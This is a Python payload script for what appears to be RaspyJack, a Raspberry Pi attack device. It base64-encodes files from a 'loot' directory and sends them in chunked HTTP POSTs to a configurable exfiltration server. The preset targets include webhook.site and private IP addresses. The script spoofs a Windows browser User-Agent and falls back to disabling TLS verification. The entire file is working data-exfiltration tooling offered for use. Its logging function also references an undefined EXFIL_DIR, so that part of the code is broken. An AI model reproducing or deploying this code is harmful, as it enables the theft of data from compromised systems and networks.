#!/usr/bin/env python3
"""
RaspyJack Payload -- HTTP Exfiltration
=======================================
Author: 7h30th3r0n3

Reads files from /root/Raspyjack/loot/, encodes in base64, and
sends as POST chunks to a configurable URL.

Setup / Prerequisites:
  - Edit config at /root/Raspyjack/config/http_exfil/config.json with
    target_url of your exfil server.
  - Server must accept POST requests with JSON body.

Config: /root/Raspyjack/config/http_exfil/config.json
  Fields: target_url, chunk_size, headers, auth_token

Chunk format (JSON POST):
  {"chunk": N, "total": M, "filename": "...", "data": "<base64>"}

Controls:
  OK         -- Start transfer of selected file
  UP / DOWN  -- Select file from loot directory
  KEY1       -- Configure target URL (scroll presets)
  KEY2       -- Send ALL loot files
  KEY3       -- Exit
"""

import os
import sys
import time
import json
import base64
import threading
import math
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_ROOT = "/root/Raspyjack/loot"
LOOT_DIR = os.path.join(LOOT_ROOT, "HTTPExfil")
CONFIG_DIR = "/root/Raspyjack/config/http_exfil"
CONFIG_PATH = os.path.join(CONFIG_DIR, "config.json")
DEBOUNCE = 0.25

os.makedirs(LOOT_DIR, exist_ok=True)
os.makedirs(CONFIG_DIR, exist_ok=True)

DEFAULT_CONFIG = {
    "target_url": "https://your-server.com/exfil",
    "chunk_size": 4096,
    "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
    "auth_token": "",
}

URL_PRESETS = [
    "https://your-server.com/exfil",
    "https://httpbin.org/post",
    "http://192.168.1.100:8080/upload",
    "http://10.0.0.1:9090/data",
    "https://webhook.site/your-uuid",
]

# ---------------------------------------------------------------------------
# Thread-safe state
# ---------------------------------------------------------------------------
_lock = threading.Lock()
_state = {
    "config": dict(DEFAULT_CONFIG),
    "files": [],
    "selected_idx": 0,
    "scroll_offset": 0,
    "transfer_active": False,
    "transfer_file": "",
    "transfer_progress": 0.0,
    "bytes_sent": 0,
    "chunks_sent": 0,
    "total_chunks": 0,
    "status": "Ready",
    "last_message": "",
    "abort_transfer": False,
    "url_preset_idx": 0,
}


def _get_state():
    with _lock:
        return {
            "config": dict(_state["config"]),
            "files": list(_state["files"]),
            "selected_idx": _state["selected_idx"],
            "scroll_offset": _state["scroll_offset"],
            "transfer_active": _state["transfer_active"],
            "transfer_file": _state["transfer_file"],
            "transfer_progress": _state["transfer_progress"],
            "bytes_sent": _state["bytes_sent"],
            "chunks_sent": _state["chunks_sent"],
            "total_chunks": _state["total_chunks"],
            "status": _state["status"],
            "last_message": _state["last_message"],
            "abort_transfer": _state["abort_transfer"],
            "url_preset_idx": _state["url_preset_idx"],
        }


def _set_state(**kwargs):
    with _lock:
        for k, v in kwargs.items():
            _state[k] = v


# ---------------------------------------------------------------------------
# Config persistence
# ---------------------------------------------------------------------------
def _load_config():
    """Load config from JSON or create defaults."""
    if os.path.isfile(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, "r") as f:
                loaded = json.load(f)
            merged = {**DEFAULT_CONFIG, **loaded}
            _set_state(config=merged)
            return
        except (json.JSONDecodeError, PermissionError):
            pass
    _set_state(config=dict(DEFAULT_CONFIG))
    _save_config()


def _save_config():
    """Persist config to JSON."""
    st = _get_state()
    try:
        with open(CONFIG_PATH, "w") as f:
            json.dump(st["config"], f, indent=2)
    except Exception:
        _set_state(last_message="Config save failed")


# ---------------------------------------------------------------------------
# File discovery
# ---------------------------------------------------------------------------
def _scan_loot_files():
    """Recursively discover files in loot directory."""
    files = []
    if not os.path.isdir(LOOT_ROOT):
        return files

    for dirpath, dirnames, filenames in os.walk(LOOT_ROOT):
        # Skip our own config directory
        if "HTTPExfil" in dirpath:
            continue
        for fname in sorted(filenames):
            fpath = os.path.join(dirpath, fname)
            if os.path.isfile(fpath):
                rel_path = os.path.relpath(fpath, LOOT_ROOT)
                size = os.path.getsize(fpath)
                files.append({
                    "path": fpath,
                    "rel_path": rel_path,
                    "name": fname,
                    "size": size,
                })
    return files


def _refresh_file_list():
    """Update the file list in state."""
    files = _scan_loot_files()
    st = _get_state()
    new_idx = min(st["selected_idx"], max(0, len(files) - 1))
    _set_state(files=files, selected_idx=new_idx)


def _format_size(size_bytes):
    """Format bytes as human-readable string."""
    if size_bytes < 1024:
        return f"{size_bytes}B"
    elif size_bytes < 1024 * 1024:
        return f"{size_bytes / 1024:.1f}K"
    else:
        return f"{size_bytes / (1024 * 1024):.1f}M"


# ---------------------------------------------------------------------------
# HTTP transfer
# ---------------------------------------------------------------------------
def _send_file(file_info):
    """Send a single file in base64-encoded chunks via HTTP POST."""
    try:
        import requests
    except ImportError:
        _set_state(
            status="Error",
            last_message="requests not installed",
            transfer_active=False,
        )
        return False

    st = _get_state()
    cfg = st["config"]
    target_url = cfg["target_url"]
    chunk_size = cfg.get("chunk_size", 4096)
    auth_token = cfg.get("auth_token", "")
    custom_headers = dict(cfg.get("headers", {}))

    if auth_token:
        custom_headers["Authorization"] = f"Bearer {auth_token}"

    filepath = file_info["path"]
    filename = file_info["rel_path"]

    try:
        with open(filepath, "rb") as f:
            raw_data = f.read()
    except (FileNotFoundError, PermissionError) as exc:
        _set_state(
            status="Error",
            last_message=f"Read err: {str(exc)[:15]}",
            transfer_active=False,
        )
        return False

    encoded = base64.b64encode(raw_data).decode("ascii")
    total_chunks = max(1, math.ceil(len(encoded) / chunk_size))

    _set_state(
        transfer_file=filename,
        total_chunks=total_chunks,
        chunks_sent=0,
        bytes_sent=0,
        status="Sending",
    )

    session = requests.Session()
    session.headers.update(custom_headers)

    success = True
    for i in range(total_chunks):
        if _get_state()["abort_transfer"]:
            _set_state(status="Aborted", last_message="Transfer aborted")
            success = False
            break

        start = i * chunk_size
        end = min(start + chunk_size, len(encoded))
        chunk_data = encoded[start:end]

        payload = {
            "chunk": i + 1,
            "total": total_chunks,
            "filename": filename,
            "data": chunk_data,
        }

        try:
            resp = session.post(
                target_url,
                json=payload,
                timeout=30,
                verify=True,
            )
            if resp.status_code not in (200, 201, 204):
                _set_state(
                    status="Error",
                    last_message=f"HTTP {resp.status_code}",
                )
                success = False
                break
        except requests.exceptions.SSLError:
            # Retry without SSL verification
            try:
                resp = session.post(
                    target_url,
                    json=payload,
                    timeout=30,
                    verify=False,
                )
                if resp.status_code not in (200, 201, 204):
                    _set_state(status="Error", last_message=f"HTTP {resp.status_code}")
                    success = False
                    break
            except Exception as exc:
                _set_state(status="Error", last_message=f"SSL err: {str(exc)[:14]}")
                success = False
                break
        except requests.exceptions.ConnectionError:
            _set_state(status="Error", last_message="Connection refused")
            success = False
            break
        except requests.exceptions.Timeout:
            _set_state(status="Error", last_message="Timeout")
            success = False
            break
        except Exception as exc:
            _set_state(status="Error", last_message=f"Err: {str(exc)[:16]}")
            success = False
            break

        progress = ((i + 1) / total_chunks) * 100
        _set_state(
            chunks_sent=i + 1,
            bytes_sent=end,
            transfer_progress=progress,
        )

    session.close()

    if success:
        _log_transfer(filename, len(raw_data), total_chunks)
    return success


def _send_single_file():
    """Transfer the currently selected file."""
    st = _get_state()
    if not st["files"]:
        _set_state(last_message="No files found")
        return

    file_info = st["files"][st["selected_idx"]]
    _set_state(
        transfer_active=True,
        abort_transfer=False,
        status="Starting",
        transfer_progress=0.0,
    )

    success = _send_file(file_info)

    if success:
        _set_state(
            status="Complete",
            last_message=f"Sent: {file_info['name'][:15]}",
            transfer_active=False,
        )
    else:
        _set_state(transfer_active=False)


def _send_all_files():
    """Transfer all loot files sequentially."""
    st = _get_state()
    if not st["files"]:
        _set_state(last_message="No files found")
        return

    files = list(st["files"])
    total = len(files)
    sent_count = 0

    _set_state(
        transfer_active=True,
        abort_transfer=False,
        status=f"Batch 0/{total}",
    )

    for i, file_info in enumerate(files):
        if _get_state()["abort_transfer"]:
            _set_state(status="Aborted", last_message=f"Sent {sent_count}/{total}")
            break

        _set_state(status=f"Batch {i + 1}/{total}")
        success = _send_file(file_info)
        if success:
            sent_count += 1
        else:
            # Continue with next file on error
            _set_state(last_message=f"Skip: {file_info['name'][:12]}")
            time.sleep(0.5)

    _set_state(
        transfer_active=False,
        status="Batch done",
        last_message=f"Sent {sent_count}/{total} files",
    )


def _log_transfer(filename, size, chunks):
    """Log successful transfer to manifest."""
    log_path = os.path.join(EXFIL_DIR, "transfer_log.jsonl")
    entry = {
        "timestamp": datetime.now().isoformat(),
        "filename": filename,
        "size_bytes": size,
        "chunks": chunks,
    }
    try:
        with open(log_path, "a") as f:
            f.write(json.dumps(entry) + "\n")
    except Exception:
        pass


# ---------------------------------------------------------------------------
# URL preset cycling
# ---------------------------------------------------------------------------
def _cycle_url_preset():
    """Cycle through URL presets."""
    st = _get_state()
    new_idx = (st["url_preset_idx"] + 1) % len(URL_PRESETS)
    new_url = URL_PRESETS[new_idx]
    cfg = {**st["config"], "target_url": new_url}
    _set_state(config=cfg, url_preset_idx=new_idx)
    _save_config()
    _set_state(last_message=f"URL: {new_url[:18]}")


# ---------------------------------------------------------------------------
# LCD drawing
# ---------------------------------------------------------------------------
def _draw_lcd():
    """Render current state on LCD."""
    st = _get_state()
    cfg = st["config"]
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    # Header
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "HTTP EXFIL", font=font, fill="#FF8800")
    status_color = "#00FF00" if st["status"] == "Complete" else "#FFAA00"
    if st["status"] == "Error":
        status_color = "#FF0000"
    d.text((80, 1), st["status"][:7], font=font, fill=status_color)

    # Target URL (truncated)
    url_display = cfg["target_url"][:21]
    d.text((2, 16), url_display, font=font, fill="#888")

    # Transfer progress
    if st["transfer_active"] or st["status"] in ("Complete", "Error"):
        # File being transferred
        d.text((2, 28), f"F: {st['transfer_file'][:17]}", font=font, fill="#AAAAAA")

        # Progress bar
        bar_y = 40
        d.rectangle((2, bar_y, 125, bar_y + 10), outline="#444")
        bar_w = int(123 * st["transfer_progress"] / 100)
        if bar_w > 0:
            bar_color = "#00AA44" if st["status"] != "Error" else "#AA0000"
            d.rectangle((2, bar_y, 2 + bar_w, bar_y + 10), fill=bar_color)
        pct_text = f"{st['transfer_progress']:.0f}%"
        d.text((52, bar_y + 1), pct_text, font=font, fill="white")

        # Stats
        d.text((2, 54), f"Chunks: {st['chunks_sent']}/{st['total_chunks']}", font=font, fill="#888")
        d.text((2, 66), f"Sent: {_format_size(st['bytes_sent'])}", font=font, fill="#888")

    # File list
    files = st["files"]
    if files:
        list_y_start = 78 if st["transfer_active"] else 30
        max_visible = (105 - list_y_start) // 11
        scroll = st["scroll_offset"]

        for i in range(max_visible):
            file_idx = scroll + i
            if file_idx >= len(files):
                break
            f = files[file_idx]
            y = list_y_start + i * 11
            is_sel = (file_idx == st["selected_idx"])

            if is_sel:
                d.rectangle((0, y, 127, y + 10), fill="#333355")

            name_display = f["name"][:14]
            size_display = _format_size(f["size"])
            fg = "#FFFFFF" if is_sel else "#666666"
            d.text((2, y), name_display, font=font, fill=fg)
            d.text((100, y), size_display, font=font, fill="#888")

            if is_sel:
                d.text((92, y), ">", font=font, fill="#FFAA00")
    else:
        d.text((10, 50), "No loot files", font=font, fill="#666")

    # Message
    d.rectangle((0, 106, 127, 115), fill="#0A0A0A")
    d.text((2, 106), st["last_message"][:21], font=font, fill="#FFCC00")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), "OK:Send K2:All K3:Quit", font=font, fill="#AAA")

    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    _load_config()
    _refresh_file_list()

    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 20), "HTTP EXFIL", font=font, fill="#FF8800")
    d.text((4, 36), "Base64 chunked POST", font=font, fill="#888")
    d.text((4, 56), "OK=Send  U/D=Select", font=font, fill="#666")
    d.text((4, 68), "K1=URL  K2=Send All", font=font, fill="#666")
    d.text((4, 80), "K3=Exit", font=font, fill="#666")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(1.5)

    try:
        while True:
            _draw_lcd()
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                _set_state(abort_transfer=True)
                break

            elif btn == "OK":
                st = _get_state()
                if st["transfer_active"]:
                    _set_state(abort_transfer=True)
                else:
                    threading.Thread(
                        target=_send_single_file, daemon=True,
                    ).start()
                time.sleep(DEBOUNCE)

            elif btn == "UP":
                st = _get_state()
                new_idx = max(0, st["selected_idx"] - 1)
                scroll = st["scroll_offset"]
                if new_idx < scroll:
                    scroll = new_idx
                _set_state(selected_idx=new_idx, scroll_offset=scroll)
                time.sleep(DEBOUNCE)

            elif btn == "DOWN":
                st = _get_state()
                max_idx = max(0, len(st["files"]) - 1)
                new_idx = min(max_idx, st["selected_idx"] + 1)
                scroll = st["scroll_offset"]
                max_visible = 6
                if new_idx >= scroll + max_visible:
                    scroll = new_idx - max_visible + 1
                _set_state(selected_idx=new_idx, scroll_offset=scroll)
                time.sleep(DEBOUNCE)

            elif btn == "KEY1":
                _cycle_url_preset()
                time.sleep(DEBOUNCE)

            elif btn == "KEY2":
                st = _get_state()
                if not st["transfer_active"]:
                    _refresh_file_list()
                    threading.Thread(
                        target=_send_all_files, daemon=True,
                    ).start()
                time.sleep(DEBOUNCE)

            elif btn == "LEFT":
                _refresh_file_list()
                _set_state(last_message="Files refreshed")
                time.sleep(DEBOUNCE)

            elif btn == "RIGHT":
                _refresh_file_list()
                time.sleep(DEBOUNCE)

            time.sleep(0.05)

    finally:
        _set_state(abort_transfer=True)
        time.sleep(0.3)
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
